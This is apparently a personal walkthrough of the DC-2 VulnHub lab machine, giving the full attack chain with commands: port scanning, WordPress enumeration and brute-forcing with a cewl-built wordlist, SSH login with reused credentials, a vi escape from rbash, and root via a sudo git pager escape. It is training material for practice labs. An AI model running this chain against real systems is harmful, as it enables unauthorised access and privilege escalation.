# DC-2 (VulnHub) — My Walkthrough

**Target:** 10.0.2.7 | **Attacker:** Kali, 10.0.2.6 | **Result:** Root, all flags

DC-2 turned out to be more of a "chain of small things" box than a single big exploit — WordPress creds, an SSH port hiding in plain sight, a restricted shell to break out of, a user pivot, then a GTFOBins privesc. Here's the full path.

---

## 1. Full port scan

```bash
nmap -sC -sV -O -T5 -p- 10.0.2.7
```

A default nmap scan only shows port 80 on this box, which is a bit of a trap — I had to go all-in with `-p-` to sweep all 65535 ports, and that's what revealed a non-standard SSH port hiding way up high. `-T5` just sped things up since I didn't need to be stealthy in my own lab.

## 2. Quick look at the web server

```bash
curl -I http://dc-2
```

Just grabbing headers to confirm the server's alive and see what's running before I go deeper.

## 3. Enumerating WordPress

```bash
wpscan --url http://dc-2 --enumerate --disable-tls-checks
```

This pulled valid usernames off the WordPress install, which I needed for the password attack next.

## 4. Building a wordlist from the site itself

```bash
cewl http://dc-2 -w dc2.txt --with-numbers -d 4
cat dc2.txt
wc -l dc2.txt
```

I knew going in that the real password wasn't going to be in rockyou or any generic list — DC-2 is built around the idea that the password is hidden in the site's own content. `cewl` crawls the site and builds a wordlist from what it finds, `-d 4` so it goes four links deep. Checked the word count afterward just as a sanity check before throwing it at anything.

## 5. Putting together a username list

```bash
nano users.txt
cat users.txt
```

Manually typed in the usernames wpscan found earlier, one per line.

## 6. Brute-forcing the login

```bash
wpscan --url http://dc-2 -U users.txt -P dc2.txt --disable-tls-checks
```

Ran every username against every password from my custom wordlist. This is what cracked `jerry` and `tom`'s creds.

## 7. Re-scanning to pin down the SSH port

```bash
sudo nmap -p- 10.0.2.7
```

Ran the full sweep again, this time specifically to confirm the SSH port before I tried connecting — found it on 7744.

## 8. SSHing in

```bash
ssh tom@10.0.2.7 -p 7744
```

Used tom's password from the wpscan crack. Worked immediately — turned out the WordPress and SSH creds were reused, which is a pretty realistic finding in itself (password reuse across services is a real-world weakness, not just a CTF gimmick).

## 9. Breaking out of a restricted shell

```bash
vi
:set shell=/bin/bash
:shell
export PATH=$PATH:/bin:/usr/bin
cat flag3.txt
```

Tom's shell turned out to be `rbash` — restricted bash — which blocks most commands, `cat` included. But `vi` itself wasn't restricted, and vi has a built-in shell-escape feature. So I opened vi, told it explicitly which shell binary to use, then used `:shell` to drop into it — since vi wasn't restricted, the shell it spawns isn't either. Had to manually fix my PATH afterward since the restricted shell's limited PATH meant even basic commands weren't resolving.

Flag 3 was sitting right there once I could actually read files, and it was a not-so-subtle "Tom and Jerry" hint pointing me toward `su jerry`.

## 10. Pivoting to jerry

```bash
su jerry
ls -la /home/jerry
cat /home/jerry/flag4.txt
```

Same password reuse pattern worked again to switch users. Found Flag 4 in jerry's home directory. I also ran `sudo -l` here (not shown above) and found jerry had passwordless sudo rights on `/usr/bin/git` — that's the privesc path.

## 11. Root via git (GTFOBins)

```bash
sudo git -p help config
!/bin/sh
```

`-p` forces git's help output through a pager (`less`). Since this whole thing runs under `sudo`, the pager itself launches as root — and `less` has a built-in `!` command to run a shell command without leaving the pager. Because the pager is root, the shell it spawns is root too.

That gave me a full root shell, confirmed with `whoami` / `id` showing `uid=0(root)`.

## 12. Final flag

```bash
cat /root/final-flag.txt
```

And that's DC-2 fully done.

---

## Quick Reference

| Step | Command | What it did |
|---|---|---|
| 1 | `nmap -sC -sV -O -T5 -p- <ip>` | Full port + service + OS scan |
| 2 | `curl -I http://<target>` | Grabbed HTTP headers |
| 3 | `wpscan --url <url> --enumerate --disable-tls-checks` | Enumerated WP users/plugins/themes |
| 4 | `cewl <url> -w <file> --with-numbers -d 4` | Built a custom wordlist from the site |
| 5 | `nano users.txt` | Created my username list |
| 6 | `wpscan --url <url> -U users.txt -P wordlist.txt` | Brute-forced WP login |
| 7 | `sudo nmap -p- <ip>` | Confirmed the hidden SSH port |
| 8 | `ssh user@<ip> -p <port>` | SSH'd in on the non-standard port |
| 9 | `vi` → `:set shell=/bin/bash` → `:shell` | Escaped the restricted shell |
| 10 | `su <user>` | Pivoted to another local user |
| 11 | `sudo git -p help config` → `!/bin/sh` | GTFOBins privesc via git |
| 12 | `cat /root/final-flag.txt` | Confirmed root, read the final flag |
